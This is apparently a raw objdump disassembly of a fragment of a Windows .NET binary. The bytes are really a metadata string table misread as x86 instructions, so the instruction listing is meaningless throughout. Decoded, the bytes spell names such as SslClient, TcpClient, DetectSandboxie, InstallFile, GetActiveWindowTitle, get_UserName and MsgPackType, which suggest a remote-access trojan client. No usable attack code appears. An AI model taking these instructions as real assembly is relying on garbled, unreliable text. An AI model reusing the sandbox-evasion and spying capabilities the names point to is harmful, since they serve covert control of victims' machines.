  407c82:	67 46                	addr16 inc %esi
  407c84:	69 65 6c 64 00 3c 53 	imul   $0x533c0064,0x6c(%ebp),%esp
  407c8b:	73 6c                	jae    0x407cf9
  407c8d:	43                   	inc    %ebx
  407c8e:	6c                   	insb   (%dx),%es:(%edi)
  407c8f:	69 65 6e 74 3e 6b 5f 	imul   $0x5f6b3e74,0x6e(%ebp),%esp
  407c96:	5f                   	pop    %edi
  407c97:	42                   	inc    %edx
  407c98:	61                   	popa
  407c99:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407c9c:	6e                   	outsb  %ds:(%esi),(%dx)
  407c9d:	67 46                	addr16 inc %esi
  407c9f:	69 65 6c 64 00 3c 54 	imul   $0x543c0064,0x6c(%ebp),%esp
  407ca6:	63 70 43             	arpl   %esi,0x43(%eax)
  407ca9:	6c                   	insb   (%dx),%es:(%edi)
  407caa:	69 65 6e 74 3e 6b 5f 	imul   $0x5f6b3e74,0x6e(%ebp),%esp
  407cb1:	5f                   	pop    %edi
  407cb2:	42                   	inc    %edx
  407cb3:	61                   	popa
  407cb4:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407cb7:	6e                   	outsb  %ds:(%esi),(%dx)
  407cb8:	67 46                	addr16 inc %esi
  407cba:	69 65 6c 64 00 49 6e 	imul   $0x6e490064,0x6c(%ebp),%esp
  407cc1:	6e                   	outsb  %ds:(%esi),(%dx)
  407cc2:	65 72 41             	gs jb  0x407d06
  407cc5:	64 64 4d             	fs fs dec %ebp
  407cc8:	61                   	popa
  407cc9:	70 43                	jo     0x407d0e
  407ccb:	68 69 6c 64 00       	push   $0x646c69
  407cd0:	49                   	dec    %ecx
  407cd1:	6e                   	outsb  %ds:(%esi),(%dx)
  407cd2:	6e                   	outsb  %ds:(%esi),(%dx)
  407cd3:	65 72 41             	gs jb  0x407d17
  407cd6:	64 64 41             	fs fs inc %ecx
  407cd9:	72 72                	jb     0x407d4d
  407cdb:	61                   	popa
  407cdc:	79 43                	jns    0x407d21
  407cde:	68 69 6c 64 00       	push   $0x646c69
  407ce3:	68 57 6e 64 00       	push   $0x646e57
  407ce8:	53                   	push   %ebx
  407ce9:	65 6e                	outsb  %gs:(%esi),(%dx)
  407ceb:	64 00 41 70          	add    %al,%fs:0x70(%ecx)
  407cef:	70 65                	jo     0x407d56
  407cf1:	6e                   	outsb  %ds:(%esi),(%dx)
  407cf2:	64 00 52 65          	add    %dl,%fs:0x65(%edx)
  407cf6:	67 69 73 74 72 79 56 	imul   $0x61567972,0x74(%bp,%di),%esi
  407cfd:	61 
  407cfe:	6c                   	insb   (%dx),%es:(%edi)
  407cff:	75 65                	jne    0x407d66
  407d01:	4b                   	dec    %ebx
  407d02:	69 6e 64 00 52 65 70 	imul   $0x70655200,0x64(%esi),%ebp
  407d09:	6c                   	insb   (%dx),%es:(%edi)
  407d0a:	61                   	popa
  407d0b:	63 65 00             	arpl   %esp,0x0(%ebp)
  407d0e:	43                   	inc    %ebx
  407d0f:	72 65                	jb     0x407d76
  407d11:	61                   	popa
  407d12:	74 65                	je     0x407d79
  407d14:	49                   	dec    %ecx
  407d15:	6e                   	outsb  %ds:(%esi),(%dx)
  407d16:	73 74                	jae    0x407d8c
  407d18:	61                   	popa
  407d19:	6e                   	outsb  %ds:(%esi),(%dx)
  407d1a:	63 65 00             	arpl   %esp,0x0(%ebp)
  407d1d:	73 65                	jae    0x407d84
  407d1f:	74 5f                	je     0x407d80
  407d21:	4d                   	dec    %ebp
  407d22:	6f                   	outsl  %ds:(%esi),(%dx)
  407d23:	64 65 00 46 69       	fs add %al,%gs:0x69(%esi)
  407d28:	6c                   	insb   (%dx),%es:(%edi)
  407d29:	65 4d                	gs dec %ebp
  407d2b:	6f                   	outsl  %ds:(%esi),(%dx)
  407d2c:	64 65 00 50 61       	fs add %dl,%gs:0x61(%eax)
  407d31:	64 64 69 6e 67 4d 6f 	fs imul $0x65646f4d,%fs:0x67(%esi),%ebp
  407d38:	64 65 
  407d3a:	00 45 6e             	add    %al,0x6e(%ebp)
  407d3d:	74 65                	je     0x407da4
  407d3f:	72 44                	jb     0x407d85
  407d41:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  407d45:	4d                   	dec    %ebp
  407d46:	6f                   	outsl  %ds:(%esi),(%dx)
  407d47:	64 65 00 43 72       	fs add %al,%gs:0x72(%ebx)
  407d4c:	79 70                	jns    0x407dbe
  407d4e:	74 6f                	je     0x407dbf
  407d50:	53                   	push   %ebx
  407d51:	74 72                	je     0x407dc5
  407d53:	65 61                	gs popa
  407d55:	6d                   	insl   (%dx),%es:(%edi)
  407d56:	4d                   	dec    %ebp
  407d57:	6f                   	outsl  %ds:(%esi),(%dx)
  407d58:	64 65 00 43 6f       	fs add %al,%gs:0x6f(%ebx)
  407d5d:	6d                   	insl   (%dx),%es:(%edi)
  407d5e:	70 72                	jo     0x407dd2
  407d60:	65 73 73             	gs jae 0x407dd6
  407d63:	69 6f 6e 4d 6f 64 65 	imul   $0x65646f4d,0x6e(%edi),%ebp
  407d6a:	00 43 69             	add    %al,0x69(%ebx)
  407d6d:	70 68                	jo     0x407dd7
  407d6f:	65 72 4d             	gs jb  0x407dbf
  407d72:	6f                   	outsl  %ds:(%esi),(%dx)
  407d73:	64 65 00 53 65       	fs add %dl,%gs:0x65(%ebx)
  407d78:	6c                   	insb   (%dx),%es:(%edi)
  407d79:	65 63 74 4d 6f       	arpl   %esi,%gs:0x6f(%ebp,%ecx,2)
  407d7e:	64 65 00 75 74       	fs add %dh,%gs:0x74(%ebp)
  407d83:	66 38 45 6e          	data16 cmp %al,0x6e(%ebp)
  407d87:	63 6f 64             	arpl   %ebp,0x64(%edi)
  407d8a:	65 00 44 65 6c       	add    %al,%gs:0x6c(%ebp,%eiz,2)
  407d8f:	65 74 65             	gs je  0x407df7
  407d92:	53                   	push   %ebx
  407d93:	75 62                	jne    0x407df7
  407d95:	4b                   	dec    %ebx
  407d96:	65 79 54             	gs jns 0x407ded
  407d99:	72 65                	jb     0x407e00
  407d9b:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407d9f:	74 5f                	je     0x407e00
  407da1:	4d                   	dec    %ebp
  407da2:	65 73 73             	gs jae 0x407e18
  407da5:	61                   	popa
  407da6:	67 65 00 44 65       	add    %al,%gs:0x65(%si)
  407dab:	74 65                	je     0x407e12
  407dad:	63 74 53 61          	arpl   %esi,0x61(%ebx,%edx,2)
  407db1:	6e                   	outsb  %ds:(%esi),(%dx)
  407db2:	64 62 6f 78          	bound  %ebp,%fs:0x78(%edi)
  407db6:	69 65 00 49 6e 76 6f 	imul   $0x6f766e49,0x0(%ebp),%esp
  407dbd:	6b 65 00 49          	imul   $0x49,0x0(%ebp),%esp
  407dc1:	45                   	inc    %ebp
  407dc2:	6e                   	outsb  %ds:(%esi),(%dx)
  407dc3:	75 6d                	jne    0x407e32
  407dc5:	65 72 61             	gs jb  0x407e29
  407dc8:	62 6c 65 00          	bound  %ebp,0x0(%ebp,%eiz,2)
  407dcc:	49                   	dec    %ecx
  407dcd:	44                   	inc    %esp
  407dce:	69 73 70 6f 73 61 62 	imul   $0x6261736f,0x70(%ebx),%esi
  407dd5:	6c                   	insb   (%dx),%es:(%edi)
  407dd6:	65 00 54 6f 44       	add    %dl,%gs:0x44(%edi,%ebp,2)
  407ddb:	6f                   	outsl  %ds:(%esi),(%dx)
  407ddc:	75 62                	jne    0x407e40
  407dde:	6c                   	insb   (%dx),%es:(%edi)
  407ddf:	65 00 53 77          	add    %dl,%gs:0x77(%ebx)
  407de3:	61                   	popa
  407de4:	70 44                	jo     0x407e2a
  407de6:	6f                   	outsl  %ds:(%esi),(%dx)
  407de7:	75 62                	jne    0x407e4b
  407de9:	6c                   	insb   (%dx),%es:(%edi)
  407dea:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407dee:	74 5f                	je     0x407e4f
  407df0:	48                   	dec    %eax
  407df1:	61                   	popa
  407df2:	6e                   	outsb  %ds:(%esi),(%dx)
  407df3:	64 6c                	fs insb (%dx),%es:(%edi)
  407df5:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  407df9:	6e                   	outsb  %ds:(%esi),(%dx)
  407dfa:	74 69                	je     0x407e65
  407dfc:	6d                   	insl   (%dx),%es:(%edi)
  407dfd:	65 46                	gs inc %esi
  407dff:	69 65 6c 64 48 61 6e 	imul   $0x6e614864,0x6c(%ebp),%esp
  407e06:	64 6c                	fs insb (%dx),%es:(%edi)
  407e08:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  407e0c:	74 4d                	je     0x407e5b
  407e0e:	6f                   	outsl  %ds:(%esi),(%dx)
  407e0f:	64 75 6c             	fs jne 0x407e7e
  407e12:	65 48                	gs dec %eax
  407e14:	61                   	popa
  407e15:	6e                   	outsb  %ds:(%esi),(%dx)
  407e16:	64 6c                	fs insb (%dx),%es:(%edi)
  407e18:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  407e1c:	6e                   	outsb  %ds:(%esi),(%dx)
  407e1d:	74 69                	je     0x407e88
  407e1f:	6d                   	insl   (%dx),%es:(%edi)
  407e20:	65 54                	gs push %esp
  407e22:	79 70                	jns    0x407e94
  407e24:	65 48                	gs dec %eax
  407e26:	61                   	popa
  407e27:	6e                   	outsb  %ds:(%esi),(%dx)
  407e28:	64 6c                	fs insb (%dx),%es:(%edi)
  407e2a:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  407e2e:	74 54                	je     0x407e84
  407e30:	79 70                	jns    0x407ea2
  407e32:	65 46                	gs inc %esi
  407e34:	72 6f                	jb     0x407ea5
  407e36:	6d                   	insl   (%dx),%es:(%edi)
  407e37:	48                   	dec    %eax
  407e38:	61                   	popa
  407e39:	6e                   	outsb  %ds:(%esi),(%dx)
  407e3a:	64 6c                	fs insb (%dx),%es:(%edi)
  407e3c:	65 00 57 61          	add    %dl,%gs:0x61(%edi)
  407e40:	69 74 48 61 6e 64 6c 	imul   $0x656c646e,0x61(%eax,%ecx,2),%esi
  407e47:	65 
  407e48:	00 57 72             	add    %dl,0x72(%edi)
  407e4b:	69 74 65 53 69 6e 67 	imul   $0x6c676e69,0x53(%ebp,%eiz,2),%esi
  407e52:	6c 
  407e53:	65 00 54 6f 53       	add    %dl,%gs:0x53(%edi,%ebp,2)
  407e58:	69 6e 67 6c 65 00 53 	imul   $0x5300656c,0x67(%esi),%ebp
  407e5f:	65 74 41             	gs je  0x407ea3
  407e62:	73 53                	jae    0x407eb7
  407e64:	69 6e 67 6c 65 00 49 	imul   $0x4900656c,0x67(%esi),%ebp
  407e6b:	6e                   	outsb  %ds:(%esi),(%dx)
  407e6c:	73 74                	jae    0x407ee2
  407e6e:	61                   	popa
  407e6f:	6c                   	insb   (%dx),%es:(%edi)
  407e70:	6c                   	insb   (%dx),%es:(%edi)
  407e71:	46                   	inc    %esi
  407e72:	69 6c 65 00 44 65 63 	imul   $0x6f636544,0x0(%ebp,%eiz,2),%ebp
  407e79:	6f 
  407e7a:	64 65 46             	fs gs inc %esi
  407e7d:	72 6f                	jb     0x407eee
  407e7f:	6d                   	insl   (%dx),%es:(%edi)
  407e80:	46                   	inc    %esi
  407e81:	69 6c 65 00 53 61 76 	imul   $0x65766153,0x0(%ebp,%eiz,2),%ebp
  407e88:	65 
  407e89:	42                   	inc    %edx
  407e8a:	79 74                	jns    0x407f00
  407e8c:	65 73 54             	gs jae 0x407ee3
  407e8f:	6f                   	outsl  %ds:(%esi),(%dx)
  407e90:	46                   	inc    %esi
  407e91:	69 6c 65 00 49 73 49 	imul   $0x6e497349,0x0(%ebp,%eiz,2),%ebp
  407e98:	6e 
  407e99:	52                   	push   %edx
  407e9a:	6f                   	outsl  %ds:(%esi),(%dx)
  407e9b:	6c                   	insb   (%dx),%es:(%edi)
  407e9c:	65 00 57 69          	add    %dl,%gs:0x69(%edi)
  407ea0:	6e                   	outsb  %ds:(%esi),(%dx)
  407ea1:	64 6f                	outsl  %fs:(%esi),(%dx)
  407ea3:	77 73                	ja     0x407f18
  407ea5:	42                   	inc    %edx
  407ea6:	75 69                	jne    0x407f11
  407ea8:	6c                   	insb   (%dx),%es:(%edi)
  407ea9:	74 49                	je     0x407ef4
  407eab:	6e                   	outsb  %ds:(%esi),(%dx)
  407eac:	52                   	push   %edx
  407ead:	6f                   	outsl  %ds:(%esi),(%dx)
  407eae:	6c                   	insb   (%dx),%es:(%edi)
  407eaf:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  407eb3:	74 41                	je     0x407ef6
  407eb5:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  407eb9:	65 57                	gs push %edi
  407ebb:	69 6e 64 6f 77 54 69 	imul   $0x6954776f,0x64(%esi),%ebp
  407ec2:	74 6c                	je     0x407f30
  407ec4:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407ec8:	74 5f                	je     0x407f29
  407eca:	4d                   	dec    %ebp
  407ecb:	61                   	popa
  407ecc:	69 6e 4d 6f 64 75 6c 	imul   $0x6c75646f,0x4d(%esi),%ebp
  407ed3:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  407ed7:	6f                   	outsl  %ds:(%esi),(%dx)
  407ed8:	63 65 73             	arpl   %esp,0x73(%ebp)
  407edb:	73 4d                	jae    0x407f2a
  407edd:	6f                   	outsl  %ds:(%esi),(%dx)
  407ede:	64 75 6c             	fs jne 0x407f4d
  407ee1:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  407ee5:	74 5f                	je     0x407f46
  407ee7:	57                   	push   %edi
  407ee8:	69 6e 64 6f 77 53 74 	imul   $0x7453776f,0x64(%esi),%ebp
  407eef:	79 6c                	jns    0x407f5d
  407ef1:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  407ef5:	6f                   	outsl  %ds:(%esi),(%dx)
  407ef6:	63 65 73             	arpl   %esp,0x73(%ebp)
  407ef9:	73 57                	jae    0x407f52
  407efb:	69 6e 64 6f 77 53 74 	imul   $0x7453776f,0x64(%esi),%ebp
  407f02:	79 6c                	jns    0x407f70
  407f04:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407f08:	74 5f                	je     0x407f69
  407f0a:	4e                   	dec    %esi
  407f0b:	61                   	popa
  407f0c:	6d                   	insl   (%dx),%es:(%edi)
  407f0d:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407f11:	74 5f                	je     0x407f72
  407f13:	46                   	inc    %esi
  407f14:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  407f1b:	00 
  407f1c:	73 65                	jae    0x407f83
  407f1e:	74 5f                	je     0x407f7f
  407f20:	46                   	inc    %esi
  407f21:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  407f28:	00 
  407f29:	47                   	inc    %edi
  407f2a:	65 74 54             	gs je  0x407f81
  407f2d:	65 6d                	gs insl (%dx),%es:(%edi)
  407f2f:	70 46                	jo     0x407f77
  407f31:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  407f38:	00 
  407f39:	47                   	inc    %edi
  407f3a:	65 74 46             	gs je  0x407f83
  407f3d:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  407f44:	00 
  407f45:	66 69 6c 65 4e 61 6d 	imul   $0x6d61,0x4e(%ebp,%eiz,2),%bp
  407f4c:	65 00 6c 70 4d       	add    %ch,%gs:0x4d(%eax,%esi,2)
  407f51:	6f                   	outsl  %ds:(%esi),(%dx)
  407f52:	64 75 6c             	fs jne 0x407fc1
  407f55:	65 4e                	gs dec %esi
  407f57:	61                   	popa
  407f58:	6d                   	insl   (%dx),%es:(%edi)
  407f59:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407f5d:	74 5f                	je     0x407fbe
  407f5f:	4d                   	dec    %ebp
  407f60:	61                   	popa
  407f61:	63 68 69             	arpl   %ebp,0x69(%eax)
  407f64:	6e                   	outsb  %ds:(%esi),(%dx)
  407f65:	65 4e                	gs dec %esi
  407f67:	61                   	popa
  407f68:	6d                   	insl   (%dx),%es:(%edi)
  407f69:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407f6d:	74 5f                	je     0x407fce
  407f6f:	4f                   	dec    %edi
  407f70:	53                   	push   %ebx
  407f71:	46                   	inc    %esi
  407f72:	75 6c                	jne    0x407fe0
  407f74:	6c                   	insb   (%dx),%es:(%edi)
  407f75:	4e                   	dec    %esi
  407f76:	61                   	popa
  407f77:	6d                   	insl   (%dx),%es:(%edi)
  407f78:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407f7c:	74 5f                	je     0x407fdd
  407f7e:	46                   	inc    %esi
  407f7f:	75 6c                	jne    0x407fed
  407f81:	6c                   	insb   (%dx),%es:(%edi)
  407f82:	4e                   	dec    %esi
  407f83:	61                   	popa
  407f84:	6d                   	insl   (%dx),%es:(%edi)
  407f85:	65 00 49 73          	add    %cl,%gs:0x73(%ecx)
  407f89:	56                   	push   %esi
  407f8a:	61                   	popa
  407f8b:	6c                   	insb   (%dx),%es:(%edi)
  407f8c:	69 64 44 6f 6d 61 69 	imul   $0x6e69616d,0x6f(%esp,%eax,2),%esp
  407f93:	6e 
  407f94:	4e                   	dec    %esi
  407f95:	61                   	popa
  407f96:	6d                   	insl   (%dx),%es:(%edi)
  407f97:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407f9b:	74 5f                	je     0x407ffc
  407f9d:	55                   	push   %ebp
  407f9e:	73 65                	jae    0x408005
  407fa0:	72 4e                	jb     0x407ff0
  407fa2:	61                   	popa
  407fa3:	6d                   	insl   (%dx),%es:(%edi)
  407fa4:	65 00 6c 6f 77       	add    %ch,%gs:0x77(%edi,%ebp,2)
  407fa9:	65 72 4e             	gs jb  0x407ffa
  407fac:	61                   	popa
  407fad:	6d                   	insl   (%dx),%es:(%edi)
  407fae:	65 00 53 65          	add    %dl,%gs:0x65(%ebx)
  407fb2:	74 4e                	je     0x408002
  407fb4:	61                   	popa
  407fb5:	6d                   	insl   (%dx),%es:(%edi)
  407fb6:	65 00 43 68          	add    %al,%gs:0x68(%ebx)
  407fba:	65 63 6b 48          	arpl   %ebp,%gs:0x48(%ebx)
  407fbe:	6f                   	outsl  %ds:(%esi),(%dx)
  407fbf:	73 74                	jae    0x408035
  407fc1:	4e                   	dec    %esi
  407fc2:	61                   	popa
  407fc3:	6d                   	insl   (%dx),%es:(%edi)
  407fc4:	65 00 6e 61          	add    %ch,%gs:0x61(%esi)
  407fc8:	6d                   	insl   (%dx),%es:(%edi)
  407fc9:	65 00 44 61 74       	add    %al,%gs:0x74(%ecx,%eiz,2)
  407fce:	65 54                	gs push %esp
  407fd0:	69 6d 65 00 67 65 74 	imul   $0x74656700,0x65(%ebp),%ebp
  407fd7:	5f                   	pop    %edi
  407fd8:	4c                   	dec    %esp
  407fd9:	61                   	popa
  407fda:	73 74                	jae    0x408050
  407fdc:	57                   	push   %edi
  407fdd:	72 69                	jb     0x408048
  407fdf:	74 65                	je     0x408046
  407fe1:	54                   	push   %esp
  407fe2:	69 6d 65 00 54 6f 55 	imul   $0x556f5400,0x65(%ebp),%ebp
  407fe9:	6e                   	outsb  %ds:(%esi),(%dx)
  407fea:	69 76 65 72 73 61 6c 	imul   $0x6c617372,0x65(%esi),%esi
  407ff1:	54                   	push   %esp
  407ff2:	69 6d 65 00 57 72 69 	imul   $0x69725700,0x65(%ebp),%ebp
  407ff9:	74 65                	je     0x408060
  407ffb:	4c                   	dec    %esp
  407ffc:	69 6e 65 00 43 6f 6d 	imul   $0x6d6f4300,0x65(%esi),%ebp
  408003:	62 69 6e             	bound  %ebp,0x6e(%ecx)
  408006:	65 00 55 72          	add    %dl,%gs:0x72(%ebp)
  40800a:	69 48 6f 73 74 4e 61 	imul   $0x614e7473,0x6f(%eax),%ecx
  408011:	6d                   	insl   (%dx),%es:(%edi)
  408012:	65 54                	gs push %esp
  408014:	79 70                	jns    0x408086
  408016:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  40801a:	74 5f                	je     0x40807b
  40801c:	56                   	push   %esi
  40801d:	61                   	popa
  40801e:	6c                   	insb   (%dx),%es:(%edi)
  40801f:	75 65                	jne    0x408086
  408021:	54                   	push   %esp
  408022:	79 70                	jns    0x408094
  408024:	65 00 76 61          	add    %dh,%gs:0x61(%esi)
  408028:	6c                   	insb   (%dx),%es:(%edi)
  408029:	75 65                	jne    0x408090
  40802b:	54                   	push   %esp
  40802c:	79 70                	jns    0x40809e
  40802e:	65 00 4d 73          	add    %cl,%gs:0x73(%ebp)
  408032:	67 50                	addr16 push %eax
  408034:	61                   	popa
  408035:	63 6b 54             	arpl   %ebp,0x54(%ebx)
  408038:	79 70                	jns    0x4080aa
  40803a:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  40803e:	6f                   	outsl  %ds:(%esi),(%dx)
  40803f:	74 6f                	je     0x4080b0
  408041:	63 6f 6c             	arpl   %ebp,0x6c(%edi)
  408044:	54                   	push   %esp
  408045:	79 70                	jns    0x4080b7
  408047:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  40804b:	74 54                	je     0x4080a1
  40804d:	79 70                	jns    0x4080bf
  40804f:	65 00 53 6f          	add    %dl,%gs:0x6f(%ebx)
  408053:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  408056:	74 54                	je     0x4080ac
  408058:	79 70                	jns    0x4080ca
  40805a:	65 00 46 69          	add    %al,%gs:0x69(%esi)
  40805e:	6c                   	insb   (%dx),%es:(%edi)
  40805f:	65 53                	gs push %ebx
  408061:	68 61 72 65 00       	push   $0x657261
  408066:	53                   	push   %ebx
  408067:	79 73                	jns    0x4080dc
  408069:	74 65                	je     0x4080d0
  40806b:	6d                   	insl   (%dx),%es:(%edi)
  40806c:	2e 43                	cs inc %ebx
  40806e:	6f                   	outsl  %ds:(%esi),(%dx)
  40806f:	72 65                	jb     0x4080d6
  408071:	00 53 65             	add    %dl,0x65(%ebx)
  408074:	72 76                	jb     0x4080ec
  408076:	65 72 73             	gs jb  0x4080ec
  408079:	69 67 6e 61 74 75 72 	imul   $0x72757461,0x6e(%edi),%esp
  408080:	65 00 43 6c          	add    %al,%gs:0x6c(%ebx)
  408084:	6f                   	outsl  %ds:(%esi),(%dx)
  408085:	73 65                	jae    0x4080ec
  408087:	00 44 69 73          	add    %al,0x73(%ecx,%ebp,2)
  40808b:	70 6f                	jo     0x4080fc
  40808d:	73 65                	jae    0x4080f4
  40808f:	00 50 61             	add    %dl,0x61(%eax)
  408092:	72 73                	jb     0x408107
  408094:	65 00 53 74          	add    %dl,%gs:0x74(%ebx)
  408098:	72 52                	jb     0x4080ec
  40809a:	65 76 65             	gs jbe 0x408102
  40809d:	72 73                	jb     0x408112
  40809f:	65 00 58 35          	add    %bl,%gs:0x35(%eax)
  4080a3:	30 39                	xor    %bh,(%ecx)
  4080a5:	43                   	inc    %ebx
  4080a6:	65 72 74             	gs jb  0x40811d
  4080a9:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  4080b0:	00 56 61             	add    %dl,0x61(%esi)
  4080b3:	6c                   	insb   (%dx),%es:(%edi)
  4080b4:	69 64 61 74 65 53 65 	imul   $0x72655365,0x74(%ecx,%eiz,2),%esp
  4080bb:	72 
  4080bc:	76 65                	jbe    0x408123
  4080be:	72 43                	jb     0x408103
  4080c0:	65 72 74             	gs jb  0x408137
  4080c3:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  4080ca:	00 63 65             	add    %ah,0x65(%ebx)
  4080cd:	72 74                	jb     0x408143
  4080cf:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  4080d6:	00 43 72             	add    %al,0x72(%ebx)
  4080d9:	65 61                	gs popa
  4080db:	74 65                	je     0x408142
  4080dd:	00 53 65             	add    %dl,0x65(%ebx)
  4080e0:	74 54                	je     0x408136
  4080e2:	68 72 65 61 64       	push   $0x64616572
  4080e7:	45                   	inc    %ebp
  4080e8:	78 65                	js     0x40814f
  4080ea:	63 75 74             	arpl   %esi,0x74(%ebp)
  4080ed:	69 6f 6e 53 74 61 74 	imul   $0x74617453,0x6e(%edi),%ebp
  4080f4:	65 00 44 65 6c       	add    %al,%gs:0x6c(%ebp,%eiz,2)
  4080f9:	65 74 65             	gs je  0x408161
  4080fc:	00 43 61             	add    %al,0x61(%ebx)
  4080ff:	6c                   	insb   (%dx),%es:(%edi)
  408100:	6c                   	insb   (%dx),%es:(%edi)
  408101:	53                   	push   %ebx
  408102:	69 74 65 00 57 72 69 	imul   $0x74697257,0x0(%ebp,%eiz,2),%esi
  408109:	74 
  40810a:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  40810e:	6d                   	insl   (%dx),%es:(%edi)
  40810f:	70 69                	jo     0x40817a
  408111:	6c                   	insb   (%dx),%es:(%edi)
  408112:	65 72 47             	gs jb  0x40815c
  408115:	65 6e                	outsb  %gs:(%esi),(%dx)
  408117:	65 72 61             	gs jb  0x40817b
  40811a:	74 65                	je     0x408181
  40811c:	64 41                	fs inc %ecx
  40811e:	74 74                	je     0x408194
  408120:	72 69                	jb     0x40818b
  408122:	62 75 74             	bound  %esi,0x74(%ebp)
  408125:	65 00 44 65 62       	add    %al,%gs:0x62(%ebp,%eiz,2)
  40812a:	75 67                	jne    0x408193
  40812c:	67 61                	addr16 popa
  40812e:	62 6c 65 41          	bound  %ebp,0x41(%ebp,%eiz,2)
  408132:	74 74                	je     0x4081a8
  408134:	72 69                	jb     0x40819f
  408136:	62 75 74             	bound  %esi,0x74(%ebp)
  408139:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  40813d:	6d                   	insl   (%dx),%es:(%edi)
  40813e:	56                   	push   %esi
  40813f:	69 73 69 62 6c 65 41 	imul   $0x41656c62,0x69(%ebx),%esi
  408146:	74 74                	je     0x4081bc
  408148:	72 69                	jb     0x4081b3
  40814a:	62 75 74             	bound  %esi,0x74(%ebp)
  40814d:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  408151:	73 65                	jae    0x4081b8
  408153:	6d                   	insl   (%dx),%es:(%edi)
  408154:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  408158:	69 74 6c 65 41 74 74 	imul   $0x72747441,0x65(%esp,%ebp,2),%esi
  40815f:	72 
  408160:	69 62 75 74 65 00 41 	imul   $0x41006574,0x75(%edx),%esp
  408167:	73 73                	jae    0x4081dc
  408169:	65 6d                	gs insl (%dx),%es:(%edi)
  40816b:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  40816f:	72 61                	jb     0x4081d2
  408171:	64 65 6d             	fs gs insl (%dx),%es:(%edi)
  408174:	61                   	popa
  408175:	72 6b                	jb     0x4081e2
  408177:	41                   	inc    %ecx
  408178:	74 74                	je     0x4081ee
  40817a:	72 69                	jb     0x4081e5
  40817c:	62 75 74             	bound  %esi,0x74(%ebp)
  40817f:	65 00 54 61 72       	add    %dl,%gs:0x72(%ecx,%eiz,2)
  408184:	67 65 74 46          	addr16 gs je 0x4081ce
  408188:	72 61                	jb     0x4081eb
  40818a:	6d                   	insl   (%dx),%es:(%edi)
  40818b:	65 77 6f             	gs ja  0x4081fd
  40818e:	72 6b                	jb     0x4081fb
  408190:	41                   	inc    %ecx
  408191:	74 74                	je     0x408207
  408193:	72 69                	jb     0x4081fe
  408195:	62 75 74             	bound  %esi,0x74(%ebp)
  408198:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  40819c:	73 65                	jae    0x408203
  40819e:	6d                   	insl   (%dx),%es:(%edi)
  40819f:	62 6c 79 46          	bound  %ebp,0x46(%ecx,%edi,2)
  4081a3:	69 6c 65 56 65 72 73 	imul   $0x69737265,0x56(%ebp,%eiz,2),%ebp
  4081aa:	69 
  4081ab:	6f                   	outsl  %ds:(%esi),(%dx)
  4081ac:	6e                   	outsb  %ds:(%esi),(%dx)
  4081ad:	41                   	inc    %ecx
  4081ae:	74 74                	je     0x408224
  4081b0:	72 69                	jb     0x40821b
  4081b2:	62 75 74             	bound  %esi,0x74(%ebp)
  4081b5:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  4081b9:	73 65                	jae    0x408220
  4081bb:	6d                   	insl   (%dx),%es:(%edi)
  4081bc:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  4081c0:	6f                   	outsl  %ds:(%esi),(%dx)
  4081c1:	6e                   	outsb  %ds:(%esi),(%dx)
  4081c2:	66 69 67 75 72 61    	imul   $0x6172,0x75(%edi),%sp
  4081c8:	74 69                	je     0x408233
  4081ca:	6f                   	outsl  %ds:(%esi),(%dx)
  4081cb:	6e                   	outsb  %ds:(%esi),(%dx)
  4081cc:	41                   	inc    %ecx
  4081cd:	74 74                	je     0x408243
  4081cf:	72 69                	jb     0x40823a
  4081d1:	62 75 74             	bound  %esi,0x74(%ebp)
  4081d4:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  4081d8:	73 65                	jae    0x40823f
  4081da:	6d                   	insl   (%dx),%es:(%edi)
  4081db:	62 6c 79 44          	bound  %ebp,0x44(%ecx,%edi,2)
  4081df:	65 73 63             	gs jae 0x408245
  4081e2:	72 69                	jb     0x40824d
  4081e4:	70 74                	jo     0x40825a
  4081e6:	69 6f 6e 41 74 74 72 	imul   $0x72747441,0x6e(%edi),%ebp
  4081ed:	69 62 75 74 65 00 44 	imul   $0x44006574,0x75(%edx),%esp
  4081f4:	65 66 61             	gs popaw
  4081f7:	75 6c                	jne    0x408265
  4081f9:	74 4d                	je     0x408248
  4081fb:	65 6d                	gs insl (%dx),%es:(%edi)
